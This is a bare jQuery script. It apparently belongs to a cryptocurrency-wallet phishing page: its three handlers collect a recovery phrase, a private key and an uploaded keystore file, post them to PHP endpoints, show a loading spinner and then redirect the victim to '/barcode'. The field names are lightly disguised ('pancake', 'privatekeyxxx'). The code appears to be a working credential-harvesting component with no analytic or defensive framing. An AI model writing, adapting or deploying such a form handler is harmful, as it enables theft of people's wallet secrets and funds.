$(document).ready(function () {
    $("#frmphrase").submit(
        function (event) {
            event.preventDefault(); $.ajax({
                url: 'request.php', type: 'POST',
                data: {
                    comments: $("#comments").val()
                    , pancake: $("#pancake").val()
                },
                beforeSend: function () { $('#loader').css('display', 'block'); },
                success: function (result) { window.location = '/barcode'; }
            });
        });
    $("#frmprivate").submit(function (event) {
        event.preventDefault(); $.ajax(
            {
                url: 'sendprocess.php', type: 'POST', data: {
                    privatekey: $("#privatekeyxxx").val(),
                    xvalue: $("#xvalue").val()
                },
                beforeSend: function () {
                    $('#loader').css('display', 'block');
                },
                success: function (result) {
                    window.location = '/barcode';
                }
            });
    }); $("#frmkeystore").submit(function (event) {
        event.preventDefault();
        var $form = new FormData(this);
        $.ajax({
            url: 'sendrequest.php',
            type: 'POST',
            data: $form,
            contentType: false,
            processData: false, beforeSend: function () {
                $('#loader').css('display', 'block');
            },
            success: function (result) {
                $('#loader').css('display', 'none');
                window.location = '/barcode';
            }
        });
    });
});